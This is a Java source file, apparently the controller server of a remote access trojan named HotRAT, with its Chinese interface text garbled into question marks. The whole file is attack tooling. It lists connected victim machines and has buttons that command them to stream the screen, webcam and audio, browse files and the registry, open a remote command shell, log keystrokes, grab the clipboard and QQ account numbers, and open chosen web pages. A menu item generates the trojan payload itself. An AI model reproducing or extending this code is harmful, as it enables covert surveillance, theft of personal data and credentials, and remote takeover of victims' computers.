package me.server;

import com.sun.java.swing.plaf.windows.WindowsButtonUI;
import com.sun.jna.platform.WindowUtils;
import me.server.createtrojan.CreateTrojan;
import me.server.loadconfig.ConfigReader;
import me.server.loadconfig.ConfigWriter;
import me.server.receive.*;
import me.server.utils.*;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class Server {
    public static HashMap<String,Socket> map = new HashMap<>();
    public static DefaultTableModel defaultListModel;
    public static DefaultTableModel defaultTableModel;
    static ServerSocket socket;
    static Socket mesocket;
    static String CFGPATH = System.getProperty("user.dir") + "\\Config.cfg";
    static String LookAndFeel = System.getProperty("user.dir") + "\\LookAndFeel.cfg";
    public static String port;
    public static final String VERSION = "7.35";
    static InputStream inputStream12 = Server.class.getClassLoader().getResourceAsStream("me/resources/maintable.png");
    static Image image12;

    static {
        try {
            image12 = ImageIO.read(inputStream12);
        } catch (IOException e) {
        }
    }
    public static void main(String[] args) {
        try {
            File file = new File(LookAndFeel);
            ConfigWriter configWriter1 = new ConfigWriter(LookAndFeel);
            ConfigWriter configWriter = new ConfigWriter(CFGPATH);
            configWriter1.CreateCFG("LookAndFeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
            configWriter.CreateCFG("port","11451");
            JFrame frame = new JFrame("HotRat"+ VERSION + " |" + " Enjoy The Blue Screen :)");
            if(file.exists()) {
                UIManager.setLookAndFeel(ConfigReader.Read(LookAndFeel,"LookAndFeel"));
            }
            port = ConfigReader.Read(CFGPATH,"port");
            defaultTableModel = new DefaultTableModel(null,new String[]{"??????","??????"});
            Date date = new Date();
            SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
            JTable chatTable = new JTable(){
                @Override
                public boolean isCellEditable(int row, int column) {
                    return false;
                }
            };
            chatTable.setModel(defaultTableModel);
            chatTable.setShowVerticalLines(false);
            chatTable.setShowHorizontalLines(false);
            chatTable.getTableHeader().setReorderingAllowed(false);
            chatTable.getTableHeader().setResizingAllowed(false);
            chatTable.getColumnModel().getColumn(0).setPreferredWidth(180);
            chatTable.getColumnModel().getColumn(1).setPreferredWidth(600);
            InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/icon.png");
            Image image = ImageIO.read(inputStream);
            InputStream inputStream1 = Server.class.getClassLoader().getResourceAsStream("me/resources/1.png");
            Image image1 = ImageIO.read(inputStream1);
            InputStream inputStream2 = Server.class.getClassLoader().getResourceAsStream("me/resources/2.png");
            Image image2 = ImageIO.read(inputStream2);
            InputStream inputStream3 = Server.class.getClassLoader().getResourceAsStream("me/resources/3.png");
            Image image3 = ImageIO.read(inputStream3);
            InputStream inputStream4 = Server.class.getClassLoader().getResourceAsStream("me/resources/4.png");
            Image image4 = ImageIO.read(inputStream4);
            InputStream inputStream5 = Server.class.getClassLoader().getResourceAsStream("me/resources/5.png");
            Image image5 = ImageIO.read(inputStream5);
            InputStream inputStream6 = Server.class.getClassLoader().getResourceAsStream("me/resources/6.png");
            Image image6 = ImageIO.read(inputStream6);
            InputStream inputStream7 = Server.class.getClassLoader().getResourceAsStream("me/resources/7.png");
            Image image7 = ImageIO.read(inputStream7);
            InputStream inputStream8 = Server.class.getClassLoader().getResourceAsStream("me/resources/8.png");
            Image image8 = ImageIO.read(inputStream8);
            InputStream inputStream10 = Server.class.getClassLoader().getResourceAsStream("me/resources/10.png");
            Image image10 = ImageIO.read(inputStream10);
            InputStream inputStream9 = Server.class.getClassLoader().getResourceAsStream("me/resources/9.png");
            Image image9 = ImageIO.read(inputStream9);
            InputStream inputStream11 = Server.class.getClassLoader().getResourceAsStream("me/resources/11.png");
            Image image11 = ImageIO.read(inputStream11);
            JScrollPane jScrollPane = new JScrollPane(chatTable);
            jScrollPane.setPreferredSize(new Dimension(0,100));
            frame.setIconImage(image);
            JMenuBar bar = new JMenuBar();
            JMenu menu = new JMenu("??????");
            JMenu menu1 = new JMenu("??????");
            JMenuItem jMenuItem = new JMenuItem("????????????");
            JMenuItem jMenuItem2 = new JMenuItem("????????????");
            JMenuItem jMenuItem1 = new JMenuItem("??????");
            JMenuItem jMenuItem3 = new JMenuItem("Swing");
            JMenuItem jMenuItem4 = new JMenuItem("Windows");
            JMenuItem jMenuItem5 = new JMenuItem("Motif");
            JMenuItem jMenuItem6 = new JMenuItem("Nimbus");
            JMenuItem jMenuItem7 = new JMenuItem("????????????");
            JMenuItem jMenuItem8 = new JMenuItem("????????????");
            JMenuItem jMenuItem9 = new JMenuItem("Smart");
            JMenuItem jMenuItem10 = new JMenuItem("Luna");
            JMenuItem jMenuItem11 = new JMenuItem("HiFi");
            frame.add(jScrollPane,BorderLayout.SOUTH);
            defaultTableModel.addRow(new String[]{format.format(date),"????????????HotRat????????????"});
            defaultTableModel.addRow(new String[]{format.format(date),"????????????????????????????????????????????? ????????????????????????"});
            defaultTableModel.addRow(new String[]{format.format(date),"??????????????????:https://github.com/Kr9jd/HotRAT"});
            defaultTableModel.addRow(new String[]{format.format(date),"????????????QQ:511413324"});
            defaultTableModel.addRow(new String[]{format.format(date),"??????????????????:" + port});
            JPanel panel = new JPanel();
            JButton button = new JButton("????????????");
            button.setIcon(new ImageIcon(image1));
            JButton button1 = new JButton("????????????");
            button1.setIcon(new ImageIcon(image2));
            JButton button2 = new JButton("????????????");
            button2.setIcon(new ImageIcon(image3));
            JButton button3 = new JButton("????????????");
            button3.setIcon(new ImageIcon(image4));
            JButton button4 = new JButton("?????????");
            button4.setIcon(new ImageIcon(image5));
            JButton button5 = new JButton("????????????");
            button5.setIcon(new ImageIcon(image6));
            JButton button6 = new JButton("????????????");
            button6.setIcon(new ImageIcon(image7));
            JButton button7 = new JButton("????????????");
            button7.setIcon(new ImageIcon(image8));
            JButton button8 = new JButton("????????????");
            button8.setIcon(new ImageIcon(image9));
            JButton button9 = new JButton("????????????");
            button9.setIcon(new ImageIcon(image10));
            JButton button10 = new JButton("????????????");
            button10.setIcon(new ImageIcon(image11));
            JToolBar jToolBar = new JToolBar();
            jToolBar.add(button);
            jToolBar.add(button1);
            jToolBar.add(button2);
            jToolBar.add(button3);
            jToolBar.add(button10);
            jToolBar.add(button4);
            jToolBar.add(button5);
            jToolBar.add(button6);
            jToolBar.add(button7);
            jToolBar.add(button9);
            jToolBar.add(button8);
            jToolBar.setFloatable(false);
            panel.add(jToolBar);
            menu.add(jMenuItem);
            menu.add(jMenuItem2);
            menu.add(jMenuItem7);
            menu.add(jMenuItem8);
            menu.add(jMenuItem1);
            menu1.add(jMenuItem3);
            menu1.add(jMenuItem4);
            menu1.add(jMenuItem5);
            menu1.add(jMenuItem6);
            menu1.add(jMenuItem9);
            menu1.add(jMenuItem10);
            menu1.add(jMenuItem11);
            bar.add(menu);
            bar.add(menu1);
            frame.setResizable(false);
            JScrollPane scrollPane = new JScrollPane();
            defaultListModel = new DefaultTableModel(null,new String[]{"","????????????","???????????????","????????????","IP??????","??????","????????????","??????ID","?????????","????????????","????????????"});
            JTable table = new JTable(defaultListModel){
                @Override
                public boolean isCellEditable(int row, int column) {
                    return false;
                }
            };
            table.setFillsViewportHeight(true);
            table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
            table.getColumnModel().getColumn(0).setPreferredWidth(25);
            table.getColumnModel().getColumn(1).setPreferredWidth(150);
            table.getColumnModel().getColumn(2).setPreferredWidth(150);
            table.getColumnModel().getColumn(3).setPreferredWidth(100);
            table.getColumnModel().getColumn(4).setPreferredWidth(150);
            table.getColumnModel().getColumn(5).setPreferredWidth(120);
            table.getColumnModel().getColumn(6).setPreferredWidth(100);
            table.getColumnModel().getColumn(7).setPreferredWidth(100);
            table.getColumnModel().getColumn(8).setPreferredWidth(150);
            table.getColumnModel().getColumn(9).setPreferredWidth(90);
            table.getColumnModel().getColumn(10).setPreferredWidth(190);
            table.getColumnModel().getColumn(0).setCellRenderer(new ImageRendererUtils());
            table.setShowHorizontalLines(false);
            table.setShowVerticalLines(false);
            table.getTableHeader().setReorderingAllowed(false);
            table.getTableHeader().setResizingAllowed(false);
            table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
            table.setRowHeight(20);
            scrollPane.setViewportView(table);
            frame.add(panel,BorderLayout.NORTH);
            frame.add(scrollPane);
            frame.setJMenuBar(bar);
            frame.setVisible(true);
            frame.setSize(1100,700);
            frame.setLocationRelativeTo(null);
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            MessageWindow.myDialog(HttpUtils.get(new URL("https://gitee.com/zhao-yk/nmsl/raw/master/HotRAT")));
            ExecutorService executorService = Executors.newCachedThreadPool();
            jMenuItem.addActionListener(a->{
                JOptionPane.showMessageDialog(null,"By RedRat Security Team \n ??????:" + VERSION,"????????????",JOptionPane.INFORMATION_MESSAGE);
            });
            jMenuItem1.addActionListener(a->{
                System.exit(0);
            });
            jMenuItem2.addActionListener(a ->{
               String str = JOptionPane.showInputDialog(null,"???????????????????????????","??????",JOptionPane.QUESTION_MESSAGE);
               configWriter.Write("port",str);
                JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem3.addActionListener(a->{
                try {
                    configWriter1.Write("LookAndFeel","javax.swing.plaf.metal.MetalLookAndFeel");
                    JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem4.addActionListener(a->{
                try {
                    configWriter1.Write("LookAndFeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
                    JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem5.addActionListener(a->{
                try {
                    configWriter1.Write("LookAndFeel","com.sun.java.swing.plaf.motif.MotifLookAndFeel");
                    JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem6.addActionListener(a->{
                configWriter1.Write("LookAndFeel","javax.swing.plaf.nimbus.NimbusLookAndFeel");
                JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem9.addActionListener(a->{
                configWriter1.Write("LookAndFeel","com.jtattoo.plaf.smart.SmartLookAndFeel");
                JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem10.addActionListener(a->{
                configWriter1.Write("LookAndFeel","com.jtattoo.plaf.luna.LunaLookAndFeel");
                JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem11.addActionListener(a->{
                configWriter1.Write("LookAndFeel","com.jtattoo.plaf.hifi.HiFiLookAndFeel");
                JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem7.addActionListener(a->{
                CreateTrojan.Create();
            });
            jMenuItem8.addActionListener(a->{
                String[] modes = {"??????","??????","??????"};
                String mode = (String) JOptionPane.showInputDialog(null,"????????????","??????",JOptionPane.QUESTION_MESSAGE,null,modes,modes[0]);
                switch (mode) {
                    case "??????":
                        table.setForeground(new Color(0,0,0));
                        table.repaint();
                        frame.repaint();
                        break;
                    case "??????":
                        table.setForeground(new Color(255,0,0));
                        table.repaint();
                        frame.repaint();
                        break;
                    case "??????":
                        table.setForeground(new Color(0,0,255));
                        table.repaint();
                        frame.repaint();
                        break;
                }
            });
            button.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.SendHead(MessageFlags.SHOW_SCREEN,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button1.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.SendHead(MessageFlags.SHOW_FILEWINDOW,map.get(str));
                        SendMessage.SendHead(MessageFlags.DISK_QUERT,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button2.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                            SendMessage.SendHead(MessageFlags.SHOW_TASKLIST,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button3.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                    SendMessage.SendHead(MessageFlags.SHOW_CAMERA,map.get(str));
                }).start();
                }catch (Exception e) {
                }
            });
            button4.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.SendHead(MessageFlags.REGIDTER_WINDOWS_SHOW,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button5.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.SendHead(MessageFlags.SHOW_REMOTE_CMD,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button6.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                    SendMessage.SendHead(MessageFlags.SHOW_KEYBORADWINDOW,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button7.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.SendHead(MessageFlags.SHOW_REMOTECHAT,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button10.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.SendHead(MessageFlags.AUDIO_WINDOWS_SHOW,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button8.addActionListener(a->{
                try {
                    new Thread(() -> {
                        String[] modes = {"????????????","????????????QQ???","?????????","????????????","???????????????","????????????","??????????????????","??????","????????????","????????????","????????????"};
                        String mode = (String) JOptionPane.showInputDialog(null,"????????????","??????",JOptionPane.QUESTION_MESSAGE,null,modes,modes[0]);
                        int temp = table.getSelectedRow();
                        String strings = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        switch (mode) {
                            case "?????????":
                                    SendMessage.SendHead(MessageFlags.BUZZER,map.get(strings));
                                break;
                            case "????????????":
                                    new MessageBox(map.get(strings));
                                break;
                            case "????????????QQ???":
                                SendMessage.SendHead(MessageFlags.SHOW_QQNUMBERWINDOW,map.get(strings));
                                break;
                            case "???????????????":
                                SendMessage.SendHead(MessageFlags.SHOW_CLIPBORADWINDOW,map.get(strings));
                                break;
                            case "??????":
                                    String str =JOptionPane.showInputDialog(null,"????????????..","??????",JOptionPane.INFORMATION_MESSAGE);
                                    SendMessage.Send(MessageFlags.FLASH_SCREEN,str.getBytes(StandardCharsets.UTF_8),map.get(strings));
                                break;
                            case "????????????":
                                SendMessage.SendHead(MessageFlags.LAN_ACCESS_OPEN,map.get(strings));
                                break;
                            case "????????????":
                                    String strs =JOptionPane.showInputDialog(null,"??????URL(???: http://baidu.com/)","??????",JOptionPane.INFORMATION_MESSAGE);
                                    SendMessage.Send(MessageFlags.WEB_BROWSE,strs.getBytes(StandardCharsets.UTF_8),map.get(strings));
                                break;
                            case "????????????":
                                String strs1 =JOptionPane.showInputDialog(null,"????????????URL(???: http://baidu.com/)","??????",JOptionPane.INFORMATION_MESSAGE);
                                SendMessage.Send(MessageFlags.PICTURE_SHOW,strs1.getBytes(),map.get(strings));
                                break;
                            case "??????????????????":
                                SendMessage.SendHead(MessageFlags.PICTURE_CLOSE,map.get(strings));
                                break;
                            case "????????????":
                                LoadNewHost.Load(map.get(strings));
                                break;
                            case "????????????":
                                    new Thread(new Runnable() {
                                        @Override
                                        public void run() {
                                            try {
                                                Update.UpLoad(map.get(strings));
                                            }catch (Exception e) {
                                            }
                                        }
                                    }).start();
                                break;
                        }
                    }).start();
                }catch (Exception e) {
                }
            });
            button9.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                            JOptionPane.showMessageDialog(null,"????????????!","??????",JOptionPane.INFORMATION_MESSAGE);
                            SendMessage.SendHead(MessageFlags.RELIEVE,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            socket = new ServerSocket(Integer.parseInt(port));
            while (true) {
                mesocket = socket.accept();
                executorService.execute(new ClientPage(mesocket,defaultListModel,frame,table));
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void flashTable(JTable table,DefaultTableModel defaultTableModel) throws IOException {
        for(int index = table.getModel().getRowCount() - 1; index >= 0; index--) {
            defaultTableModel.removeRow(index);
        }
        Set<String> hashSet = Server.map.keySet();
        for(String context:hashSet) {
            String[] strings = context.split("\\$");
            Object[] contexts = {image12,strings[0],strings[1],strings[2],strings[3],strings[4],strings[5],strings[6],strings[7],strings[8],strings[9]};
            defaultTableModel.addRow(contexts);
        }
    }
}

class ClientPage implements Runnable{
   static Socket mesocket;
    DefaultTableModel tableModel;
    JFrame frame;
    JTable table;
    public ClientPage(Socket socket,DefaultTableModel tableModel,JFrame frame,JTable table) {
        mesocket = socket;
        this.table = table;
        this.tableModel = tableModel;
        this.frame = frame;
    }
    @Override
    public void run() {
        try {
            DataInputStream dataInputStream = new DataInputStream(mesocket.getInputStream());
            String head = "H0tRAT";
            String str1 = dataInputStream.readUTF();
            String str2 = dataInputStream.readUTF();
            String str3 = dataInputStream.readUTF();
            String str4 = dataInputStream.readUTF();
            String str5 = dataInputStream.readUTF();
            String str6 = dataInputStream.readUTF();
            String str7 = dataInputStream.readUTF();
            String str8 = dataInputStream.readUTF();
            String str9 = dataInputStream.readUTF();
            String str10 = dataInputStream.readUTF();
            String str11 = dataInputStream.readUTF();
            if(!str1.contains(head)) {
                return;
            }
            Date date = new Date();
            SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
            SystemDisplay(str2,str3);
            String[] strings = new String[]{
                    str2,str3,str4,str5,str6,str7,str8,str9,str10,str11
            };
            String context = strings[0] + "$" + strings[1] + "$" + strings[2] + "$" + strings[3] + "$" + strings[4]+ "$" + strings[5]  + "$" + strings[6]
                    + "$" + strings[7]+ "$" + strings[8] + "$" + strings[9] ;
            Server.map.put(context, mesocket);
            Server.flashTable(table, tableModel);
            PlayMusic.online();
            Server.defaultTableModel.addRow(new String[]{format.format(date),"????????????:" + strings[1]});
            frame.setSize(1101,701);//????????????
            frame.setSize(1100,700);
            frame.repaint();
            new SendHeartPack(mesocket,frame,table,tableModel,context,strings[1]).start();
            new ReceiveMessage(mesocket,str5).start();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void SystemDisplay(String str,String str2) throws AWTException {
        SystemTray systemTray = SystemTray.getSystemTray();
        Image image = Toolkit.getDefaultToolkit().createImage("icon.png");
        TrayIcon trayIcon = new TrayIcon(image);
        systemTray.add(trayIcon);
        trayIcon.displayMessage("???????????????",str + "\n" + str2, TrayIcon.MessageType.INFO);
    }
}